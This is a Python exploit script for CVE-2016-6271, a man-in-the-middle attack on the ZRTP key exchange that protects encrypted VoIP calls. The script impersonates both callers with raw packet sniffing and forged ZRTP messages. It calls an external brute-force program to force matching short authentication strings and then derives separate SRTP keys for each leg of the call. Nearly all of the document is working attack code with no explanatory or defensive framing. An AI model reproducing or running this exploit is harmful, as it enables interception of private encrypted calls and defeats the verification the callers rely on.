#!/usr/bin/env python3

import socket
from scapy.all import *
import asyncio
import os
from struct import unpack, pack
import subprocess
import re
import time

from binascii import hexlify
from binascii import unhexlify as ux
import hashlib
import hmac

import zrtp.protocol
import zrtp.auth
import zrtp.pubkey
import zrtp.cipher
import zrtp.sas
import zrtp.hash


# derive hash chain from H0
# values will be used to authenticate sent messages
def derive_hashchain(h0):
  h = h0
  chain = [h0]

  for i in range(3):
    h = hashlib.sha256(h).digest()
    chain.append(h)

  return chain

assert(derive_hashchain(ux('06fa3b98d71b2d4d2037886f9417377b312dd17ddd769ef7b651dcc3a661d382')) == [
  ux('06fa3b98d71b2d4d2037886f9417377b312dd17ddd769ef7b651dcc3a661d382'),
  ux('e54ed85bdbd82feeb3cc8e6fab43d9c23c049095a45a534d9788ce83fe92e275'),
  ux('6d6f62d8123e0a175d7d85f811cb2200046961da776c46feae87e2b454c96fc5'),
  ux('5ecde82016ea439b570ef0a854667270b7e2792419b38bbbe07e14ec51ac7e93')
])

# authenticate ZRTP message
def default_authenticate(key, data):
  m = hmac.new(key, digestmod=hashlib.sha256)
  m.update(data)
  return m.digest()[:8]

assert(default_authenticate(
  ux('6d6f62d8123e0a175d7d85f811cb2200046961da776c46feae87e2b454c96fc5'),
  ux('505a001d48656c6c6f202020312e3130474e55205a52545020342e352e3020205ecde82016ea439b570ef0a854667270b7e2792419b38bbbe07e14ec51ac7e9354f2b6af22cca341ee5845060002202153333834534b4e3332465333414553334448336b4543333842323536')) == ux('379b200f0fab4d3f'))


loop = asyncio.get_event_loop()

MITM_SETUP = {
  '(instead of bob)': ('198.42.42.2', '198.42.12.2', 0x00000b0b, 'eth0', 1, 'b0b'),
  '(instead of alice)': ('198.42.12.2', '198.42.42.2', 0x000a71ce, 'eth1', 0, 'al1ce'),
}

class ZRTPEndpoint:
  def __init__(self, label):
    self.input_queue = asyncio.Queue()
    self.peer = None

    assert(label in MITM_SETUP)
    self.label = label
    (self.src, self.dst, self.ssrc, self.iface, self.passive, self.zid) = MITM_SETUP[label]

    self.seq = random.randint(42, 128)

    self.zid = self.zid.encode('UTF-8')
    while len(self.zid) < 12:
      self.zid += b'\x00'
    assert(len(self.zid) == 12)

    self.H = derive_hashchain(b'omg wtf!'*4)

    self.peer_zid = None

    self.rs1 = b'\x00'*8
    self.rs2 = b'\x00'*8
    self.auxsecret = b'\x00'*8
    self.pbxsecret = b'\x00'*8

    self.history = {}

    self.target_sas = None

  def MAC(self, key, data):
    m = self.auth_alg(key)
    m.update(data)
    return m.digest()

  def send(self, data):
    pkt = zrtp.protocol.Pkt(
      version=0,
      padding=0,
      extension=1,
      seqno=self.seq,
      cookie=0x5a525450,
      src=self.ssrc,
      raw=data
    )

    frm = IP(src=self.src, dst=self.dst)/UDP(sport=0x1337,dport=0x1337)/ \
      zrtp.protocol.encode(pkt)
    self.seq += 1

    send(frm, iface=self.iface, verbose=False)

  @asyncio.coroutine
  def run(self):
    hello = zrtp.protocol.Hello(
      version=b'1.10',
      clt=b'OMG WTF!OMG WTF!',
      h3=self.H[3],
      zid=self.zid,
      S=0,
      M=0,
      P=self.passive,
      hashes=[b'S256'],
      ciphers=[b'AES3'],
      auths=[b'HS32'],
      keys=[b'DH3k'],
      sass=[b'B256'],
      mac=0
    )

    data = zrtp.protocol.encode_hello(hello)
    hello = data[:-8] + default_authenticate(self.H[2], data[:-8])

    hello_received = False
    hello_ack_received = False

    while not hello_received or not hello_ack_received:
      pkt = yield from self.input_queue.get()
      if type(pkt.msg) == zrtp.protocol.Hello:
        data = zrtp.protocol.encode_hello_ack()
        self.send(data)
        if self.passive:
          self.history['Hello'] = hello
        else:
          self.history['Hello'] = pkt.raw

        if not hello_received:
          hello_received = True
          self.peer_zid = pkt.msg.zid
          self.send(hello)
      elif type(pkt.msg) == zrtp.protocol.HelloAck:
        hello_ack_received = True

    pkt = yield from self.input_queue.get()
    assert(type(pkt.msg) == zrtp.protocol.DHCommit)
    self.history['Commit'] = pkt.raw

    if not self.passive:
      # TODO: complete Commit to win tie
      commit = zrtp.protocol.DHCommit(
        h2 = self.H[2],
        zid = self.zid,
        hash = b'S256',
        cipher = b'AES1',
        auth = b'HS32',
        key = b'DH3k',
        sas = b'B32 ',
        hvi = b'\xff'*32,
        mac = 0,
      )

      data = zrtp.protocol.encode_dhcommit(commit)
      commit = data[:-8] + default_authenticate(self.H[1], data[:-8])[:8]
      self.send(commit)
      self.history['Commit'] = commit

    self.hash_alg = zrtp.hash.get(pkt.msg.hash)
    self.cipher_alg = zrtp.cipher.get(pkt.msg.cipher)

    self.auth_alg = zrtp.auth.get(pkt.msg.auth)
    self.key_xchg = zrtp.pubkey.get(pkt.msg.key)
    self.sas_alg = zrtp.sas.get(pkt.msg.sas)

    KDF = zrtp.hash.get_kdf(self.hash_alg)

    if self.passive:
      self.rs1IDr = self.MAC(self.rs1, b'Responder')[:8]
      self.rs2IDr = self.MAC(self.rs2, b'Responder')[:8]
      self.auxsecretIDr = self.MAC(self.auxsecret, self.H[3])[:8]
      self.pbxsecretIDr = self.MAC(self.pbxsecret, b'Responder')[:8]

      pvr = self.key_xchg.generate_key()

      dhpart1 = zrtp.protocol.DHPart1(
        h1 = self.H[1],
        rs1idr = self.rs1IDr,
        rs2idr = self.rs2IDr,
        auxsecretidr = self.auxsecretIDr,
        pbxsecretidr = self.pbxsecretIDr,
        pvr = pvr,
        mac = 0,
      )

      data = zrtp.protocol.encode_dhpart1(dhpart1)
      dhpart1 = data[:-8] + default_authenticate(self.H[0], data[:-8])[:8]
      self.send(dhpart1)
      self.history['DHPart1'] = dhpart1

      pkt = yield from self.input_queue.get()
      assert(type(pkt.msg) == zrtp.protocol.DHPart2)
      self.history['DHPart2'] = pkt.raw

      # DHresult
      dhresult = self.key_xchg.shared_secret(pkt.msg.pvi)

      # total_hash
      m = hashlib.sha256()
      m.update(self.history['Hello'])
      m.update(self.history['Commit'])
      m.update(self.history['DHPart1'])
      m.update(self.history['DHPart2'])
      total_hash = m.digest()

      # KDF_Context
      KDF_Context = self.peer_zid + self.zid + total_hash

      # suppose no secrets are shared between us
      s1 = b''
      s2 = b''
      s3 = b''

      # s0
      m = self.hash_alg()
      m.update(pack('!I', 1))
      m.update(dhresult)
      m.update(b'ZRTP-HMAC-KDF')
      m.update(self.peer_zid)
      m.update(self.zid)
      m.update(total_hash)

      m.update(pack('!I', len(s1)) + s1)
      m.update(pack('!I', len(s2)) + s2)
      m.update(pack('!I', len(s3)) + s3)
      s0 = m.digest()

      # SAS
      sashash = KDF(s0, b'SAS', KDF_Context, 256)
      sasval = sashash[:4]
      self.target_sas = sasval

      # 256 for SHA256, shall be the negotiated hash length
      self.mackeyi = KDF(s0, b'Initiator HMAC key', KDF_Context, 256)
      self.mackeyr = KDF(s0, b'Responder HMAC key', KDF_Context, 256)

      # ZRTP keys used to cipher Confirmation
      self.zrtpkeyi = KDF(s0, b'Initiator ZRTP key', KDF_Context, self.cipher_alg.keybits)
      self.zrtpkeyr = KDF(s0, b'Responder ZRTP key', KDF_Context, self.cipher_alg.keybits)

      # SRTP keys used to setup SRTP cryptocontext
      self.srtpkeyi = KDF(s0, b'Initiator SRTP master key', KDF_Context, self.cipher_alg.keybits)
      self.srtpkeyr = KDF(s0, b'Responder SRTP master key', KDF_Context, self.cipher_alg.keybits)

      self.srtpsalti = KDF(s0, b'Initiator SRTP master salt', KDF_Context, 112)
      self.srtpsaltr = KDF(s0, b'Responder SRTP master salt', KDF_Context, 112)

      confirmation = zrtp.protocol.Confirmation(
        h0 = self.H[0],
        E = 0,
        V = 0,
        A = 0,
        D = 0,
        cache_expiration = 0xffffffff,
      )
      data = zrtp.protocol.encode_confirmation(confirmation)

      cfb_iv = b'\x00'*16
      encrypted_confirmation = self.cipher_alg.constructor(self.zrtpkeyr, cfb_iv).encrypt(data)
      assert(len(encrypted_confirmation) == len(data))

      confirm_mac = self.MAC(self.mackeyr, encrypted_confirmation)[:8]

      confirm1 = zrtp.protocol.Confirm(
        confirm_mac = confirm_mac,
        cfb_iv = cfb_iv,
        encrypted = encrypted_confirmation,
      )

      data = zrtp.protocol.encode_confirm1(confirm1)
      self.send(data)

      pkt = yield from self.input_queue.get()
      assert(type(pkt.msg) == zrtp.protocol.Confirm)

      data = zrtp.protocol.encode_conf2ack()
      self.send(data)

      print('ZRTP exchange with Alice is over, SAS = %s' % self.sas_alg(self.target_sas))
      print('SRTP keying material is derived, and specific to Alice <-> Mallory')
    else:
      pkt = yield from self.input_queue.get()
      assert(type(pkt.msg) == zrtp.protocol.DHPart1)
      self.history['DHPart1'] = pkt.raw

      self.rs1IDi = self.MAC(self.rs1, b'Initiator')[:8]
      self.rs2IDi = self.MAC(self.rs2, b'Initiator')[:8]
      self.auxsecretIDi = self.MAC(self.auxsecret, self.H[3])[:8]
      self.pbxsecretIDi = self.MAC(self.pbxsecret, b'Initiator')[:8]

      # shall send DHPart2 now, but need to synchronize with other side
      # to find a matching SAS value
      assert(self.peer is not None)
      while self.peer.target_sas is None:
        yield from asyncio.sleep(1)
      assert(self.peer.target_sas is not None)

      initiator_chain = hexlify(self.history['Hello'] + self.history['Commit'] +
        self.history['DHPart1']).decode('UTF-8')
      sasval = hexlify(self.peer.target_sas).decode('UTF-8')
      pvr = hexlify(pkt.msg.pvr).decode('UTF-8')
      zidi = hexlify(self.zid).decode('UTF-8')
      zidr = hexlify(self.peer_zid).decode('UTF-8')

      print('initiating bruteforce ...')
      start = time.time()

      output = subprocess.check_output(['/root/bruteforce',
        initiator_chain, pvr, sasval, zidi, zidr, '8'], shell=False)
      m = re.search(b'svi = ([0-9]+)', output)
      assert(m)
      end = time.time()
      print('   %r' % (end-start))

      x = int(m.group(1), 10)
      self.key_xchg.x = x

      pvi = self.key_xchg.generate_key()

      dhpart2 = zrtp.protocol.DHPart2(
        h1 = self.H[1],
        rs1idi = self.rs1IDi,
        rs2idi = self.rs2IDi,
        auxsecretidi = self.auxsecretIDi,
        pbxsecretidi = self.pbxsecretIDi,
        pvi = pvi,
        mac = 0,
      )

      data = zrtp.protocol.encode_dhpart2(dhpart2)
      dhpart2 = data[:-8] + default_authenticate(self.H[0], data[:-8])[:8]

      self.send(dhpart2)
      self.history['DHPart2'] = dhpart2


      # DHresult
      dhresult = self.key_xchg.shared_secret(pkt.msg.pvr)

      # total_hash
      m = hashlib.sha256()
      m.update(self.history['Hello'])
      m.update(self.history['Commit'])
      m.update(self.history['DHPart1'])
      m.update(self.history['DHPart2'])
      total_hash = m.digest()

      # KDF_Context
      KDF_Context = self.zid + self.peer_zid + total_hash

      # suppose no secrets are shared between us
      s1 = b''
      s2 = b''
      s3 = b''

      # s0
      m = self.hash_alg()
      m.update(pack('!I', 1))
      m.update(dhresult)
      m.update(b'ZRTP-HMAC-KDF')
      m.update(self.zid)
      m.update(self.peer_zid)
      m.update(total_hash)

      m.update(pack('!I', len(s1)) + s1)
      m.update(pack('!I', len(s2)) + s2)
      m.update(pack('!I', len(s3)) + s3)
      s0 = m.digest()

      # SAS
      sashash = KDF(s0, b'SAS', KDF_Context, 256)
      sasval = sashash[:4]



      # 256 for SHA256, shall be the negotiated hash length
      self.mackeyi = KDF(s0, b'Initiator HMAC key', KDF_Context, 256)
      self.mackeyr = KDF(s0, b'Responder HMAC key', KDF_Context, 256)

      # ZRTP keys used to cipher Confirmation
      self.zrtpkeyi = KDF(s0, b'Initiator ZRTP key', KDF_Context, self.cipher_alg.keybits)
      self.zrtpkeyr = KDF(s0, b'Responder ZRTP key', KDF_Context, self.cipher_alg.keybits)

      # SRTP keys used to setup SRTP cryptocontext
      self.srtpkeyi = KDF(s0, b'Initiator SRTP master key', KDF_Context, self.cipher_alg.keybits)
      self.srtpkeyr = KDF(s0, b'Responder SRTP master key', KDF_Context, self.cipher_alg.keybits)

      self.srtpsalti = KDF(s0, b'Initiator SRTP master salt', KDF_Context, 112)
      self.srtpsaltr = KDF(s0, b'Responder SRTP master salt', KDF_Context, 112)



      pkt = yield from self.input_queue.get()
      assert(type(pkt.msg) == zrtp.protocol.Confirm)

      confirmation = zrtp.protocol.Confirmation(
        h0 = self.H[0],
        E = 0,
        V = 0,
        A = 0,
        D = 0,
        cache_expiration = 0xffffffff,
      )
      data = zrtp.protocol.encode_confirmation(confirmation)

      cfb_iv = b'\x00'*16
      encrypted_confirmation = self.cipher_alg.constructor(self.zrtpkeyi, cfb_iv).encrypt(data)
      assert(len(encrypted_confirmation) == len(data))

      confirm_mac = self.MAC(self.mackeyi, encrypted_confirmation)[:8]

      confirm2 = zrtp.protocol.Confirm(
        confirm_mac = confirm_mac,
        cfb_iv = cfb_iv,
        encrypted = encrypted_confirmation,
      )

      data = zrtp.protocol.encode_confirm2(confirm2)
      self.send(data)

      pkt = yield from self.input_queue.get()
      assert(type(pkt.msg) == zrtp.protocol.Conf2Ack)

      print('ZRTP exchange with Bob is over, and both SAS match')
      print('SRTP keying material is derived, and specific to Bob <-> Mallory')




class CVE_2016_6271:
  def __init__(self):
    self.input_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0008)
    self.input_socket.setblocking(False)

    self.fake_alice = ZRTPEndpoint('(instead of bob)')
    self.fake_bob = ZRTPEndpoint('(instead of alice)')

    self.fake_alice.peer = self.fake_bob
    self.fake_bob.peer = self.fake_alice

    loop.create_task(self.fake_alice.run())
    loop.create_task(self.fake_bob.run())

  @asyncio.coroutine
  def run(self):
    while True:
      data = yield from loop.sock_recv(self.input_socket, 4096)
      pkt = Ether(data)
      if UDP in pkt and Raw in pkt:
        dst = pkt[IP].dst

        data = pkt[Raw].load
        zrtp_pkt = zrtp.protocol.decode(data)

        if dst == '198.42.42.2':
          yield from self.fake_alice.input_queue.put(zrtp_pkt)
        elif dst == '198.42.12.2':
          yield from self.fake_bob.input_queue.put(zrtp_pkt)



mitm = CVE_2016_6271()

loop.create_task(mitm.run())
loop.run_forever()
loop.close()
